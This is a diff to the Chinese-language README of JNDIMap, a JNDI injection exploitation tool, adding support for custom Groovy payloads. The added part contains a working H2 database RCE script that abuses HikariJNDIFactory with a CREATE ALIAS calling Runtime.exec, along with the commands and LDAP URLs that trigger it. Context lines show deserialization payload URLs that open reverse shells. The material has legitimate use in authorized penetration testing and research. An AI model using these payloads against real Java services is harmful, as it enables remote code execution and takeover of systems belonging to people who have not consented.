@@ -13,6 +13,7 @@ JNDIMap 是一个 JNDI 注入利用工具, 支持 RMI 和 LDAP 协议, 包含多
 - NativeLibLoader 加载动态链接库
 - MLet 探测可用 Class
 - LDAP 反序列化
+- 自定义 JNDI Payload (基于 Groovy 语言)
 
 ## Build
 
@@ -27,7 +28,7 @@ mvn package -Dmaven.test.skip=true
 ## Usage
 
 ```bash
-Usage: java -jar JNDIMap.jar [-i <ip>] [-r <rmiPort>] [-l <ldapPort>] [-p <httpPort>] [-u <url>] [-h]
+Usage: java -jar JNDIMap.jar [-i <ip>] [-r <rmiPort>] [-l <ldapPort>] [-p <httpPort>] [-u <url>] [-f <file>] [-h]
 ````
 
 `-i`: 服务器监听 IP (即 codebase, 必须指定为一个目标可访问到的 IP, 例如 `192.168.1.100`, 不能用 `0.0.0.0`)
@@ -38,7 +39,9 @@ Usage: java -jar JNDIMap.jar [-i <ip>] [-r <rmiPort>] [-l <ldapPort>] [-p <httpP
 
 `-p`: HTTP 服务器监听端口, 默认为 `3456`
 
-`-u`: 手动指定路由, 例如 `/Basic/Command/open -a Calculator` (某些场景的 JNDI URL 并不完全可控)
+`-u`: 手动指定 JNDI 路由, 例如 `/Basic/Command/open -a Calculator` (某些场景的 JNDI URL 并不完全可控)
+
+`-f`: Groovy 脚本路径, 用于编写自定义 JNDI Payload
 
 `-h`: 显示 Usage 信息
 
@@ -347,6 +350,54 @@ ldap://127.0.0.1:1389/Deserialize/CommonsBeanutils194/ReverseShell/127.0.0.1/444
 # 使用 JdkDynamicAopProxy 优化不稳定性问题, 需要 spring-aop 依赖
 ldap://127.0.0.1:1389/Deserialize/Jackson/Command/open -a Calculator
 ldap://127.0.0.1:1389/Deserialize/Jackson/ReverseShell/127.0.0.1/4444
+```
+
+### Custom
+
+JNDIMap 支持使用 [Groovy](https://groovy-lang.org/) 语言编写自定义 JNDI Payload
+
+Groovy 脚本 (以 H2 RCE 为例)
+
+```groovy
+import javax.naming.Reference
+import javax.naming.StringRefAddr
+
+def list = []
+list << "CREATE ALIAS EXEC AS 'String shellexec(String cmd) throws java.io.IOException {Runtime.getRuntime().exec(cmd)\\;return \"test\"\\;}'"
+list << "CALL EXEC('$args')" // 参数通过 args 变量传入
+
+def url = "jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=${list.join('\\;')}\\;"
+
+def ref = new Reference("javax.sql.DataSource", "com.zaxxer.hikari.HikariJNDIFactory", null)
+ref.add(new StringRefAddr("driverClassName", "org.h2.Driver"))
+ref.add(new StringRefAddr("jdbcUrl", url))
+
+return ref // 返回 Reference 对象
+```
+
+运行 JNDIMap
+
+```bash
+java -jar JNDIMap.jar -f /path/to/evil.groovy
+```
+
+通过以下 JNDI URL 实现 RCE
+
+```bash
+# 支持手动向 Groovy 脚本传入参数
+ldap://127.0.0.1:1389/Custom/<args>
+```
+
+如果在某些情况下, 无法完全控制 JNDI URL, 可以指定 `-u` 参数
+
+```bash
+java -jar JNDIMap.jar -f /path/to/evil.groovy -u "/Custom/open -a Calculator"
+```
+
+然后通过任意 JNDI URL 触发
+
+```bash
+ldap://127.0.0.1:1389/x
 ```
 
 ## Reference
